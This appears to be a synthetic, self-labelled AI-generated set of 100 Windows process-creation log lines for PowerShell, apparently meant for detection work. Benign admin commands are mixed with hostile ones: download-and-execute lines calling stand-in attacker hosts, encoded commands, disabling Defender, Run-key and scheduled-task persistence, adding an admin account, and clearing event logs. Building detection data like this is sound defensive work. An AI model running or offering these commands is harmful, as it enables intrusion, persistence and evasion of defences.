@@ -1,0 +1,102 @@
+#AI GENERATED SAMPLE#
+
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe -NoP -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAnACk= #1
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://evil-site.com/payload.ps1') #2
+EventID=1 Image=powershell.exe CommandLine=powershell.exe -enc aQBlAHgAIAAoAGcAYwBtACAAaAB0AHQAcAA6AC8ALwBiAGEAZAAuAGMAbwBtAC8AcwBoAGUAbABsACk= #3
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Invoke-WebRequest http://malicious.com/file.exe -OutFile file.exe #4
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe wget http://attacker.net/backdoor.ps1 #5
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe curl http://bad-domain.org/script.ps1 #6
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://45.77.12.9/run.ps1') #7
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\update.ps1 #8
+EventID=1 Image=powershell.exe CommandLine=powershell.exe -EncodedCommand JABXAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA= #9
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe IEX(iwr http://cdn-update.net/ps.ps1) #10
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-Process #11
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-Service #12
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-ChildItem C:\Windows\System32 #13
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-EventLog -LogName Security -Newest 20 #14
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Test-Connection google.com #15
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe ipconfig /all #16
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-NetIPAddress #17
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe whoami #18
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-Date #19
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-ExecutionPolicy #20
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe -nop -c IEX(New-Object Net.WebClient).DownloadString('http://pastebin.com/raw/AbC123') #21
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Invoke-Expression (Invoke-WebRequest http://hxxp://badcdn.net/drop.ps1) #22
+EventID=1 Image=powershell.exe CommandLine=powershell.exe -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAbQBkAC4AZQB4AGUA #23
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Start-Process cmd.exe #24
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe schtasks /create /sc onlogon /tn updater /tr update.ps1 #25
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Add-MpPreference -ExclusionPath C:\Users\Public #26
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true #27
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe New-Item C:\Temp\test.txt #28
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Remove-Item C:\Temp\test.txt #29
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-LocalUser #30
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe -nop -w hidden -enc SQBtAGUAcwBzAGEAZwBlACAAYgBhAGMAawBkAG8AbwByAA== #31
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Invoke-WebRequest http://update-check.org/a.exe -OutFile a.exe #32
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Start-BitsTransfer http://fileshare.ru/agent.ps1 C:\Users\Public\agent.ps1 #33
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d powershell.exe #34
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-WmiObject Win32_Process #35
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-CimInstance Win32_OperatingSystem #36
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Stop-Service WinDefend #37
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Enable-PSRemoting -Force #38
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Enter-PSSession -ComputerName DC01 #39
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Exit-PSSession #40
+EventID=1 Image=powershell.exe CommandLine=powershell.exe -EncodedCommand JABTAEgARQBMAEwAPQAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgAxAC8AcgAuAHAAcwAxACIA #41
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe IEX(iwr http://10.0.0.1/r.ps1) #42
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe net user admin Temp123! /add #43
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe net localgroup administrators admin /add #44
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-Content C:\Users\Public\agent.ps1 #45
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Set-ExecutionPolicy Unrestricted -Scope Process #46
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-HotFix #47
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-NetTCPConnection #48
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Resolve-DnsName microsoft.com #49
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-Help Get-Process #50
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://185.22.33.44/s.ps1') #51
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Invoke-WebRequest http://dropper.site/load.bin -OutFile load.bin #52
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe rundll32.exe javascript:"\..\mshtml,RunHTMLApplication" #53
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Compress-Archive C:\Users\Public\data C:\Users\Public\data.zip #54
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Expand-Archive data.zip C:\Temp #55
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-Clipboard #56
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Set-Clipboard "test" #57
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-LocalGroup #58
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-PSDrive #59
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Clear-History #60
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe -enc SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwBjAG8AbQBwAHIAbwBtAGkAcwBlAC4AbgBlAHQALwBkAG8AdwBuAC4AcABzADEAKQA= #61
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe IEX (iwr http://compromise.net/down.ps1) #62
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-ScheduledTask #63
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Register-ScheduledTask -TaskName updater #64
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-FileHash C:\Windows\System32\notepad.exe #65
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Start-Sleep -Seconds 5 #66
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Measure-Object -Line #67
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-Command *Web* #68
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-Alias #69
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-History #70
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe -nop -c IEX(New-Object Net.WebClient).DownloadString('http://raw.githubusercontent.com/user/repo/m.ps1') #71
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Invoke-WebRequest http://update-service.io/patch.ps1 #72
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-ComputerInfo #73
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-TimeZone #74
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Set-TimeZone -Name "UTC" #75
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-Random #76
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-Uptime #77
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Write-Output "Hello" #78
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Out-File C:\Temp\out.txt #79
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Exit #80
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe -enc UwBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA #81
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe IEX (New-Object Net.WebClient) #82
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-Process powershell #83
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Stop-Process -Name powershell -Force #84
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Restart-Computer -Force #85
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-Service WinRM #86
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V #87
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol #88
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-PSVersionTable #89
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe $PSVersionTable #90
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe -nop -w hidden -c IEX(iwr http://malware-delivery.biz/x.ps1) #91
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Invoke-WebRequest http://malware-delivery.biz/x.ps1 #92
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-Module #93
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Import-Module ActiveDirectory #94
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-ADUser admin #95
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-ADComputer * #96
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Get-EventLog System -Newest 5 #97
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Clear-EventLog System #98
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Shutdown /r /t 0 #99
+EventID=4688 ProcessName=powershell.exe CommandLine=powershell.exe Logoff #100
